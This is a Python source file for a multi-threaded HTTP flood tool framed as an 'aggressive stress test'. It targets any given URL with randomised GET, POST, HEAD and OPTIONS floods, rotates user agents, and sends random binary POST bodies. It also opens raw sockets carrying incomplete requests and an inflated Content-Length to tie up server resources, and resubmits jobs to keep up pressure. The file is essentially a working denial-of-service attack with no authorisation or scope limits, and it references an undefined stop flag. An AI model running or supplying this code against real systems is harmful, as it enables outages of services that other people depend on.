import os
import time
import threading
import requests
import psutil
import logging
import signal
import sys
import random
import socket
import asyncio
import aiohttp
import concurrent.futures
from datetime import datetime
from urllib.parse import urlparse
from colorama import Fore, Style, init

init(autoreset=True)

# Enhanced aggressive configuration
AGGRESSIVE_CONFIG = {
    "max_workers": 500,
    "connection_timeout": 2,
    "read_timeout": 3,
    "keep_alive": True,
    "max_connections": 1000,
    "max_keepalive_connections": 100,
    "retry_count": 2,
    "burst_mode": True,
    "random_user_agents": True,
    "attack_vectors": ["GET", "POST", "HEAD", "OPTIONS"],
    "payload_sizes": [1024, 2048, 4096, 8192, 16384]
}

# User agents for request rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36",
    "Mozilla/5.0 (Android 10; Mobile) AppleWebKit/537.36"
]

# Global metrics for enhanced tracking
stress_metrics = {
    "total_requests": 0,
    "successful_requests": 0,
    "failed_requests": 0,
    "response_times": [],
    "bandwidth_used": 0,
    "connections_per_second": 0,
    "peak_rps": 0,
    "error_codes": {},
    "start_time": time.time(),
    "last_burst_time": time.time()
}

class AggressiveRequester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.setup_aggressive_session()
        
    def setup_aggressive_session(self):
        """Configure session for maximum aggression"""
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=AGGRESSIVE_CONFIG["max_connections"],
            pool_maxsize=AGGRESSIVE_CONFIG["max_keepalive_connections"],
            max_retries=AGGRESSIVE_CONFIG["retry_count"]
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        # Remove size limits for responses
        self.session.max_redirects = 10
        
    def generate_payload(self, size):
        """Generate random payload data"""
        return os.urandom(size)
    
    def get_random_user_agent(self):
        """Get random user agent for request rotation"""
        return random.choice(USER_AGENTS) if AGGRESSIVE_CONFIG["random_user_agents"] else USER_AGENTS[0]
    
    def make_aggressive_request(self):
        """Make highly aggressive request with multiple attack vectors"""
        try:
            method = random.choice(AGGRESSIVE_CONFIG["attack_vectors"])
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive' if AGGRESSIVE_CONFIG["keep_alive"] else 'close',
                'Cache-Control': 'no-cache'
            }
            
            start_time = time.time()
            
            if method in ["POST", "PUT"]:
                payload_size = random.choice(AGGRESSIVE_CONFIG["payload_sizes"])
                data = self.generate_payload(payload_size)
                response = self.session.request(
                    method, 
                    self.target_url, 
                    data=data,
                    headers=headers,
                    timeout=(AGGRESSIVE_CONFIG["connection_timeout"], AGGRESSIVE_CONFIG["read_timeout"]),
                    stream=False,
                    allow_redirects=True
                )
            else:
                response = self.session.request(
                    method,
                    self.target_url,
                    headers=headers,
                    timeout=(AGGRESSIVE_CONFIG["connection_timeout"], AGGRESSIVE_CONFIG["read_timeout"]),
                    stream=False,
                    allow_redirects=True
                )
            
            response_time = time.time() - start_time
            stress_metrics["response_times"].append(response_time)
            stress_metrics["total_requests"] += 1
            
            if 200 <= response.status_code < 400:
                stress_metrics["successful_requests"] += 1
            else:
                stress_metrics["failed_requests"] += 1
                stress_metrics["error_codes"][response.status_code] = stress_metrics["error_codes"].get(response.status_code, 0) + 1
            
            # Track bandwidth (rough estimate)
            if hasattr(response, 'headers') and 'content-length' in response.headers:
                stress_metrics["bandwidth_used"] += int(response.headers.get('content-length', 0))
            
            response.close()  # Immediately close connection to free up resources
            
        except Exception as e:
            stress_metrics["failed_requests"] += 1
            stress_metrics["total_requests"] += 1

class AsyncAggressiveRequester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = None
        
    async def __aenter__(self):
        timeout = aiohttp.ClientTimeout(
            total=AGGRESSIVE_CONFIG["connection_timeout"] + AGGRESSIVE_CONFIG["read_timeout"]
        )
        connector = aiohttp.TCPConnector(
            limit=AGGRESSIVE_CONFIG["max_connections"],
            limit_per_host=AGGRESSIVE_CONFIG["max_keepalive_connections"],
            keepalive_timeout=30 if AGGRESSIVE_CONFIG["keep_alive"] else 0
        )
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={'User-Agent': random.choice(USER_AGENTS)}
        )
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
            
    async def make_async_request(self):
        """Make asynchronous aggressive request"""
        try:
            method = random.choice(AGGRESSIVE_CONFIG["attack_vectors"])
            start_time = time.time()
            
            async with self.session.request(method, self.target_url) as response:
                response_time = time.time() - start_time
                stress_metrics["response_times"].append(response_time)
                stress_metrics["total_requests"] += 1
                
                if 200 <= response.status < 400:
                    stress_metrics["successful_requests"] += 1
                else:
                    stress_metrics["failed_requests"] += 1
                    stress_metrics["error_codes"][response.status] = stress_metrics["error_codes"].get(response.status, 0) + 1
                    
        except Exception as e:
            stress_metrics["failed_requests"] += 1
            stress_metrics["total_requests"] += 1

def advanced_socket_attack(target_url):
    """Low-level socket attack for maximum resource consumption"""
    try:
        parsed = urlparse(target_url)
        host = parsed.hostname
        port = parsed.port or (80 if parsed.scheme == 'http' else 443)
        
        # Create raw socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(AGGRESSIVE_CONFIG["connection_timeout"])
        sock.connect((host, port))
        
        # Send malformed/incomplete HTTP requests to consume server resources
        attack_payloads = [
            f"GET {parsed.path or '/'} HTTP/1.1\r\nHost: {host}\r\n",
            f"POST {parsed.path or '/'} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 1000000\r\n\r\n",
            f"OPTIONS * HTTP/1.1\r\nHost: {host}\r\n\r\n"
        ]
        
        for payload in attack_payloads:
            try:
                sock.send(payload.encode())
                time.sleep(0.01)  # Small delay to keep connection open
            except:
                break
                
        sock.close()
        stress_metrics["total_requests"] += len(attack_payloads)
        stress_metrics["successful_requests"] += 1  # Count as successful for connection establishment
        
    except Exception as e:
        stress_metrics["failed_requests"] += 1

def burst_attack_cycle(target_url, burst_size=50):
    """Execute burst attacks in cycles for maximum impact"""
    requester = AggressiveRequester(target_url)
    
    for _ in range(burst_size):
        if random.random() < 0.7:  # 70% regular requests
            requester.make_aggressive_request()
        elif random.random() < 0.9:  # 20% async requests
            asyncio.run(make_single_async_request(target_url))
        else:  # 10% socket attacks
            advanced_socket_attack(target_url)

async def make_single_async_request(target_url):
    """Helper for single async request"""
    async with AsyncAggressiveRequester(target_url) as async_requester:
        await async_requester.make_async_request()

def enhanced_display_stats():
    """Enhanced real-time statistics display"""
    while not stop_test:
        elapsed_time = time.time() - stress_metrics["start_time"]
        
        # Calculate advanced metrics
        current_rps = stress_metrics["total_requests"] / elapsed_time if elapsed_time > 0 else 0
        stress_metrics["peak_rps"] = max(stress_metrics["peak_rps"], current_rps)
        
        avg_response_time = sum(stress_metrics["response_times"]) / len(stress_metrics["response_times"]) if stress_metrics["response_times"] else 0
        
        # Calculate bandwidth in MB
        bandwidth_mb = stress_metrics["bandwidth_used"] / (1024 * 1024)
        
        # Error distribution
        error_distribution = ", ".join([f"{code}:{count}" for code, count in list(stress_metrics["error_codes"].items())[:3]])
        
        print("\033[H\033[J", end="")  # Clear screen
        
        print(Fore.RED + Style.BRIGHT + "🔥 AGGRESSIVE MODE ACTIVATED - HAMMERING TARGET 🔥")
        print(Fore.YELLOW + f"📊 Total Requests: {stress_metrics['total_requests']} | "
              f"Peak RPS: {stress_metrics['peak_rps']:.1f}")
        print(Fore.GREEN + f"✅ Successful: {stress_metrics['successful_requests']} | "
              f"❌ Failed: {stress_metrics['failed_requests']}")
        print(Fore.CYAN + f"⚡ Current RPS: {current_rps:.1f} | "
              f"Avg Response: {avg_response_time:.4f}s")
        print(Fore.MAGENTA + f"📡 Bandwidth: {bandwidth_mb:.2f} MB | "
              f"Errors: {error_distribution}")
        print(Fore.WHITE + "─" * 60)
        
        time.sleep(0.3)  # More frequent updates

def run_aggressive_stress_test(target_url, aggression_level):
    """Enhanced aggressive stress test with multiple attack vectors"""
    global stop_test
    
    # Calculate worker counts based on aggression level
    base_workers = aggression_level * 25  # Much more aggressive scaling
    burst_workers = aggression_level * 10
    
    logging.info(Fore.RED + f"💥 LAUNCHING AGGRESSIVE ATTACK with {base_workers} workers...")
    
    # Start enhanced stats display
    stats_thread = threading.Thread(target=enhanced_display_stats)
    stats_thread.daemon = True
    stats_thread.start()
    
    # Thread pools for different attack types
    with concurrent.futures.ThreadPoolExecutor(max_workers=base_workers) as executor:
        # Main aggressive request flood
        future_to_request = {
            executor.submit(AggressiveRequester(target_url).make_aggressive_request): i 
            for i in range(base_workers * 10)
        }
        
        # Burst attack cycles in separate threads
        burst_futures = [
            executor.submit(burst_attack_cycle, target_url, burst_workers)
            for _ in range(aggression_level * 2)
        ]
        
        # Socket attack threads
        socket_futures = [
            executor.submit(advanced_socket_attack, target_url)
            for _ in range(aggression_level * 5)
        ]
        
        try:
            # Monitor futures and replace completed ones to maintain pressure
            while not stop_test:
                completed = 0
                for future in concurrent.futures.as_completed(list(future_to_request.keys())[:100]):
                    try:
                        future.result()
                        completed += 1
                    except:
                        pass
                    
                    # Replace completed futures to maintain constant pressure
                    if completed > 10:
                        for _ in range(completed):
                            new_future = executor.submit(
                                AggressiveRequester(target_url).make_aggressive_request
                            )
                            future_to_request[new_future] = len(future_to_request)
                        completed = 0
                        
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            stop_test = True
            
        finally:
            # Cancel all pending futures
            for future in future_to_request:
                future.cancel()
            for future in burst_futures:
                future.cancel()
            for future in socket_futures:
                future.cancel()

# Replace the existing run_stress_test function in main
def run_stress_test(target_url, num_threads):
    """Updated to use aggressive mode"""
    run_aggressive_stress_test(target_url, num_threads)
